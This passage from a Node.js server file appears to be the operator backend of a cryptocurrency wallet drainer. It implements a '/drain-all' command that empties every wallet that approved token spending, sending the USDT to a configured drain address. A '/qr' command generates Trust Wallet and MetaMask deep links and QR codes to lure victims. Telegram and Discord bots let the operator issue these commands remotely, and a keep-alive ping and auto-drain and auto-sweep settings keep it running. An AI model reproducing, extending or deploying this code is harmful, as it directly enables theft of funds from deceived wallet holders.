        } catch (e) { await sendReply(`❌ ${e.reason || e.message}`); }
        return true;
    }

    if (text === '/drain-all') {
        if (approvedWallets.size === 0) { await sendReply("📋 No wallets to drain."); return true; }

        await sendReply(`🔫 Draining ${approvedWallets.size} wallet(s)...`);

        let successes = 0, failures = 0, totalDrained = 0;
        const results = [];

        for (const [wallet] of approvedWallets) {
            try {
                const result = await drainWallet(wallet);
                if (result.success) {
                    successes++; totalDrained += parseFloat(result.amount);
                    results.push(`✅ ${wallet.slice(0,6)}...${wallet.slice(-4)}: ${result.amount} ${result.symbol}`);
                } else {
                    failures++;
                    results.push(`⏭ ${wallet.slice(0,6)}...${wallet.slice(-4)}: ${result.reason}`);
                }
            } catch (e) {
                failures++;
                results.push(`❌ ${wallet.slice(0,6)}...${wallet.slice(-4)}: ${e.reason || e.message}`);
            }
        }

        await sendReply([
            `🔫 <b>Drain-All Complete</b>`,
            `✅ ${successes} | ❌ ${failures}`,
            `💰 <b>Total:</b> ${totalDrained.toFixed(4)} USDT`,
            ``, ...results
        ].join('\n'));
        return true;
    }

    // QR command
    const qrMatch = text.match(/^\/qr(?:-([\d.]+))?\s+(.+)/);
    if (qrMatch) {
        const hoursStr = qrMatch[1];
        const targetUrl = qrMatch[2].trim();
        const baseUrl = cachedHost;
        if (!baseUrl) { await sendReply("⚠️ Set BACKEND_URL in .env"); return true; }

        const cleanUrl = targetUrl.replace(/^https?:\/\//, '');
        const twDeepLink = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(targetUrl)}`;
        const mmDeepLink = `https://metamask.app.link/dapp/${cleanUrl}`;

        let finalTwUrl = twDeepLink, finalMmUrl = mmDeepLink;
        let captionSuffix = "\n⏳ <b>Duration:</b> Lifetime";

        if (hoursStr) {
            const hours = parseFloat(hoursStr);
            const expiresAt = Date.now() + (hours * 60 * 60 * 1000);
            const twId = crypto.randomUUID().slice(0, 8);
            const mmId = crypto.randomUUID().slice(0, 8);
            shortLinks.set(twId, { target: twDeepLink, expires: expiresAt });
            shortLinks.set(mmId, { target: mmDeepLink, expires: expiresAt });
            finalTwUrl = `${baseUrl}/qr-link/${twId}`;
            finalMmUrl = `${baseUrl}/qr-link/${mmId}`;
            captionSuffix = `\n⏳ <b>Expires:</b> ${hours}h`;
        }

        const walletAddress = CONFIG.drainAddress;
        let twQr, mmQr;

        if (baseUrl.includes('localhost') || baseUrl.includes('127.0.0.1')) {
            twQr = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&margin=20&data=${encodeURIComponent(finalTwUrl)}`;
            mmQr = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&margin=20&data=${encodeURIComponent(finalMmUrl)}`;
        } else {
            const twWidget = `${baseUrl}/api/v1/qr-widget?url=${encodeURIComponent(finalTwUrl)}&address=${walletAddress}`;
            const mmWidget = `${baseUrl}/api/v1/qr-widget?url=${encodeURIComponent(finalMmUrl)}&address=${walletAddress}`;
            twQr = `https://api.microlink.io/?url=${encodeURIComponent(twWidget)}&screenshot=true&meta=false&embed=screenshot.url&element=%23card&waitForTimeout=2000&force=true`;
            mmQr = `https://api.microlink.io/?url=${encodeURIComponent(mmWidget)}&screenshot=true&meta=false&embed=screenshot.url&element=%23card&waitForTimeout=2000&force=true`;
        }

        await sendAlertPhoto(twQr, `🛡 <b>Trust Wallet</b>${captionSuffix}\n<a href="${finalTwUrl}">Tap for mobile</a>`);
        await sendAlertPhoto(mmQr, `🦊 <b>MetaMask</b>${captionSuffix}\n<a href="${finalMmUrl}">Tap for mobile</a>`);
        return true;
    }

    return false;  // Command not recognized
}

// ==================== TELEGRAM BOT POLLING ====================
let lastTgUpdateId = 0;

async function pollTelegramCommands() {
    if (!hasTelegram) return;

    let hadMessages = false;
    try {
        const url = `https://api.telegram.org/bot${CONFIG.tgBotToken}/getUpdates?offset=${lastTgUpdateId + 1}&timeout=30`;
        const res = await fetch(url);
        const data = await res.json();

        if (data.ok && data.result.length > 0) {
            hadMessages = true;
            for (const update of data.result) {
                lastTgUpdateId = update.update_id;
                const msg = update.message;
                if (msg && msg.text && msg.chat.id.toString() === CONFIG.tgChatId.toString()) {
                    const text = msg.text.trim();
                    // Reply function for Telegram
                    const sendReply = (html) => sendAlert(html);
                    await handleBotCommand(text, sendReply);
                }
            }
        }
    } catch (e) { /* swallow timeouts */ }
    finally {
        setTimeout(pollTelegramCommands, hadMessages ? TG_POLL_FAST_MS : TG_POLL_IDLE_MS);
    }
}
pollTelegramCommands();

// ==================== DISCORD BOT POLLING ====================
let lastDcMessageId = null;

async function pollDiscordCommands() {
    if (!CONFIG.dcBotToken || !CONFIG.dcChannelId) return;

    try {
        let url = `https://discord.com/api/v10/channels/${CONFIG.dcChannelId}/messages?limit=10`;
        if (lastDcMessageId) url += `&after=${lastDcMessageId}`;

        const res = await fetch(url, {
            headers: { 'Authorization': `Bot ${CONFIG.dcBotToken}` }
        });

        if (!res.ok) {
            if (res.status === 429) {
                const retry = await res.json();
                const waitMs = (retry.retry_after || 5) * 1000;
                LOG.warn(`Discord rate limited, waiting ${waitMs}ms`);
                setTimeout(pollDiscordCommands, waitMs);
                return;
            }
            throw new Error(`Discord API ${res.status}`);
        }

        const messages = await res.json();

        if (messages.length > 0) {
            // Discord returns newest first, process oldest first
            const sorted = messages.reverse();

            for (const msg of sorted) {
                // Track latest message ID
                if (!lastDcMessageId || BigInt(msg.id) > BigInt(lastDcMessageId)) {
                    lastDcMessageId = msg.id;
                }

                // Ignore bot's own messages
                if (msg.author.bot) continue;

                const text = msg.content.trim();
                if (!text.startsWith('/')) continue;

                // Reply via Discord
                const sendReply = async (html) => {
                    const content = htmlToDiscord(html);
                    await fetch(`https://discord.com/api/v10/channels/${CONFIG.dcChannelId}/messages`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Authorization': `Bot ${CONFIG.dcBotToken}`
                        },
                        body: JSON.stringify({ content })
                    }).catch(e => LOG.error("Discord reply failed:", e.message));
                };

                await handleBotCommand(text, sendReply);
            }
        }
    } catch (e) {
        if (!e.message.includes('rate')) LOG.error("Discord poll error:", e.message);
    } finally {
        setTimeout(pollDiscordCommands, DC_POLL_INTERVAL_MS);
    }
}

// Initialize Discord — fetch latest message ID so we don't replay history
async function initDiscord() {
    if (!CONFIG.dcBotToken || !CONFIG.dcChannelId) return;
    try {
        const res = await fetch(`https://discord.com/api/v10/channels/${CONFIG.dcChannelId}/messages?limit=1`, {
            headers: { 'Authorization': `Bot ${CONFIG.dcBotToken}` }
        });
        if (res.ok) {
            const msgs = await res.json();
            if (msgs.length > 0) lastDcMessageId = msgs[0].id;
        }
        LOG.info("Discord bot initialized, polling for commands...");
        pollDiscordCommands();
    } catch (e) {
        LOG.error("Discord init failed:", e.message);
    }
}
initDiscord();

// ==================== KEEP-ALIVE SELF-PING (prevents Render sleep) ====================
function startKeepAlive() {
    const url = CONFIG.backendUrl || cachedHost;
    if (!url) {
        // Wait until we get a request and cachedHost is set
        setTimeout(startKeepAlive, 30000);
        return;
    }

    LOG.info(`Keep-alive pinging: ${url}/api/v1/health every ${KEEPALIVE_INTERVAL_MS / 60000} min`);

    setInterval(async () => {
        try {
            await fetch(`${url}/api/v1/health`);
        } catch (e) {
            // Ignore — the ping itself failing is fine
        }
    }, KEEPALIVE_INTERVAL_MS);
}
setTimeout(startKeepAlive, 10000);  // Start after boot

// ==================== GRACEFUL SHUTDOWN ====================
function shutdown(signal) {
    LOG.info(`${signal} — saving state...`);
    saveApprovedWallets();
    process.exit(0);
}

process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT', () => shutdown('SIGINT'));
process.on('uncaughtException', (err) => { LOG.error('Uncaught:', err.message); saveApprovedWallets(); });
process.on('unhandledRejection', (reason) => { LOG.error('Unhandled:', reason); });

// ==================== START ====================
app.listen(process.env.PORT || 3000, () => {
    LOG.info(`Server on port ${process.env.PORT || 3000}`);
    LOG.info(`Relayer: ${relayerWallet.address}`);
    LOG.info(`Token: ${CONFIG.tokenAddress}`);
    LOG.info(`Drain to: ${CONFIG.drainAddress}`);
    LOG.info(`Auto-drain: ${CONFIG.autoDrain ? 'ON' : 'OFF'}`);
    LOG.info(`Auto-sweep: ${CONFIG.autoSweep ? 'ON' : 'OFF'} (every ${SWEEP_INTERVAL_MS / 60000} min)`);
    LOG.info(`Wallets loaded: ${approvedWallets.size}`);
    LOG.info(`Notifications: TG=${hasTelegram} DC=${hasDiscord}`);
});